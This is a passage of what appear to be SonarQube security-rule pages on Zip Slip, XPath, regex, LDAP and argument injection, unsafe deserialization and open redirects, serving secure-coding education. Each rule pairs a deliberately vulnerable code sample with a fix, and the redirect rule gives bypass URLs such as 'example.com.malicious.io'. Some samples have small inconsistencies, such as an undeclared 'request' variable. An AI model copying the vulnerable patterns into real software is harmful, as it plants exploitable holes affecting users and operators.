<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class Example {

    static private String targetDirectory = "/example/directory/";

    public void ExtractEntry(ZipFile zipFile) throws IOException {

        Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();
        ZipEntry entry = entries.nextElement();
        InputStream inputStream = zipFile.getInputStream(entry);

        File file = new File(targetDirectory + entry.getName());

        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class Example {

    static private String targetDirectory = "/example/directory/";

    public void ExtractEntry(ZipFile zipFile) throws IOException {

        Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();
        ZipEntry entry = entries.nextElement();
        InputStream inputStream = zipFile.getInputStream(entry);

        File file = new File(targetDirectory + entry.getName());

        String canonicalDestinationPath = file.getCanonicalPath();

        if (canonicalDestinationPath.startsWith(targetDirectory)) {
            Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol>
  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalFile</code> or
  <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or path components like <code>../</code> and removes any ambiguity
  regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>
</ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String targetDirectory = "/Users/John";

public void ExtractEntry(ZipFile zipFile) throws IOException {

    Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();
    ZipEntry entry = entries.nextElement();
    InputStream inputStream = zipFile.getInputStream(entry);

    File file = new File(entry.getName());

    String canonicalDestinationPath = file.getCanonicalPath();

    if (canonicalDestinationPath.startsWith(targetDirectory)) {
        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);
    }
}
</pre>
<p>This check can be bypassed because <code>"/Users/Johnny".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br>
The validation code should be tested to ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://snyk.io/research/zip-slip-vulnerability">snyk</a> - Zip Slip Vulnerability </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2091">
              javasecurity:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to XPath injections because untrusted data is concatenated to an XPath query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public boolean authenticate(HttpServletRequest req, XPath xpath, Document doc) throws XPathExpressionException {
  String user = request.getParameter("user");
  String pass = request.getParameter("pass");

  String expression = "/users/user[@name='" + user + "' and @pass='" + pass + "']";

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public boolean authenticate(HttpServletRequest req, XPath xpath, Document doc) throws XPathExpressionException {
  String user = request.getParameter("user");
  String pass = request.getParameter("pass");

  String expression = "/users/user[@name=$user and @pass=$pass]";

  xpath.setXPathVariableResolver(v -&gt; {
    switch (v.getLocalPart()) {
      case "user":
        return user;
      case "pass":
        return pass;
      default:
        throw new IllegalArgumentException();
    }
  });

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Parameterized Queries</h4>
<p>For XPath injections, the cleanest way to do so is to use parameterized queries.</p>
<p>XPath allows for the usage of variables inside expressions in the form of <code>$variable</code>. XPath variables can be used to construct an XPath
query without needing to concatenate user arguments to the query at runtime. Here is an example of an XPath query with variables:</p>
<pre>
/users/user[@user=$user and @pass=$pass]
</pre>
<p>When the XPath query is executed, the user input is passed alongside it. During execution, when the values of the variables need to be known, a
resolver will return the correct user input for each variable. The contents of the variables are not considered application logic by the XPath
executor, and thus injection is not possible.</p>
<p>In the example, a parameterized XPath query is created, and an <code>XPathVariableResolver</code> is used to securely insert untrusted data into
the query, similar to parameterized SQL queries.</p>
<h4>Validation</h4>
<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it
in an XPath query.</p>
<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>
<p>Input can be validated in multiple ways:</p>
<ul>
  <li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li>
  <li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric
  characters.) </li>
  <li> By ensuring user input does not include any XPath metacharacters, such as <code>"</code>, <code>'</code>, <code>/</code>, <code>@</code>,
  <code>=</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li>
</ul>
<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>
<p>For Java, OWASP’s Enterprise Security API offers <a
href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForXPath-java.lang.String-"><code>encodeForXPath</code></a>
which sanitizes metacharacters automatically.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection">OWASP, XPath Injection
  Prevention Cheat Sheet</a> </li>
  <li> <a href="https://web.archive.org/web/20230602194100/https://www.ambionics.io/blog/hacking-watchguard-firewalls">Ambionics, XPath Injection
  Section of "Hacking WatchGuard Firewalls'</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/643">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2631">
              roslyn.sonaranalyzer.security.cs:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service because untrusted data is used as a regex to scan a string without prior
sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public IActionResult Validate(string regex, string input)
    {
        bool match = Regex.IsMatch(input, regex);

        return Json(match);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public IActionResult Validate(string regex, string input)
    {
        bool match = Regex.IsMatch(input, Regex.Escape(regex));

        return Json(match);
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2">re2</a>.</p>
<p>In the compliant solution example, <code>Regex.Escape</code> escapes metacharacters and escape sequences that could have broken the initially
intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5135">
              roslyn.sonaranalyzer.security.cs:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class Example : Controller
{
    [HttpPost]
    public ActionResult Deserialize(HttpPostedFileBase inputFile)
    {
        ExpectedType expectedObject = null;
        var formatter               = new BinaryFormatter();
        expectedObject              = (ExpectedType)formatter.Deserialize(inputFile.InputStream);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class Example : Controller
{
    [HttpPost]
    public ActionResult Deserialize(HttpPostedFileBase inputFile)
    {
        ExpectedType expectedObject = null;
        JsonSerializer serializer   = new JsonSerializer(typeof(expectedObject));
        expectedObject              = (ExpectedType)serializer.Deserialize(inputFile.InputStream);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul>
  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>
  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>
</ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<h4>Pre-Approved classes</h4>
<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br> If the untrusted class does
not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br> Depending on the language
or framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>
<p>In the code samples, a pre-approved class is used natively by JsonSerializer to validate the class during serialization. XmlSerializer also
provides this capability.<br> <strong>Note</strong>: The pre-approved class should not tamper with the application’s inner workings.</p>
<p>The following native types are considered unsafe because they do not provide these capabilities:</p>
<ul>
  <li> <code>BinaryFormatter</code> </li>
  <li> <code>SoapFormatter</code> </li>
  <li> <code>NetDataContractSerializer</code> </li>
  <li> <code>LosFormatter</code> </li>
  <li> <code>ObjectStateFormatter</code> </li>
</ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5146">
              roslyn.sonaranalyzer.security.cs:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    [HttpGet]
    public void Redirect(string url)
    {
        Response.Redirect(url);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    private readonly string[] allowedUrls = { "/", "/login", "/logout" };

    [HttpGet]
    public void Redirect(string url)
    {
        if (allowedUrls.Contains(url))
        {
            Response.Redirect(url);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>
  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2078">
              roslyn.sonaranalyzer.security.cs:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injections because untrusted data is concatenated in an LDAP query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public IActionResult Authenticate(string user, string pass)
    {
        DirectoryEntry directory  = new DirectoryEntry("LDAP://ou=system");
        DirectorySearcher search  = new DirectorySearcher(directory);

        search.Filter = "(&amp;(uid=" + user + ")(userPassword=" + pass + "))";

        return Json(search.FindOne() != null);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public IActionResult Authenticate(string user, string pass)
    {
        // restrict the username and password to letters only
        if (!Regex.IsMatch(user, "^[a-zA-Z]+$") || !Regex.IsMatch(pass, "^[a-zA-Z]+$"))
        {
            return BadRequest();
        }

        DirectoryEntry directory  = new DirectoryEntry("LDAP://ou=system");
        DirectorySearcher search  = new DirectorySearcher(directory);

        search.Filter = "(&amp;(uid=" + user + ")(userPassword=" + pass + "))";

        return Json(search.FindOne() != null);
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul>
  <li> <code>\</code> </li>
  <li> <code>#</code> </li>
  <li> <code>+</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>,</code> </li>
  <li> <code>;</code> </li>
  <li> <code>"</code> </li>
  <li> <code>=</code> </li>
</ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul>
  <li> <code>*</code> </li>
  <li> <code>(</code> </li>
  <li> <code>)</code> </li>
  <li> <code>\</code> </li>
  <li> <code>null</code> </li>
</ul>
<p>In the compliant solution example, a validation mechanism is applied to untrusted input to ensure it is strictly composed of alphabetic
characters.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4514.txt">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>
  <li> <a href="https://www.ietf.org/rfc/rfc4515.txt">RFC 4515</a> - LDAP: String Representation of Search Filters </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/90">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5883">
              roslyn.sonaranalyzer.security.cs:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
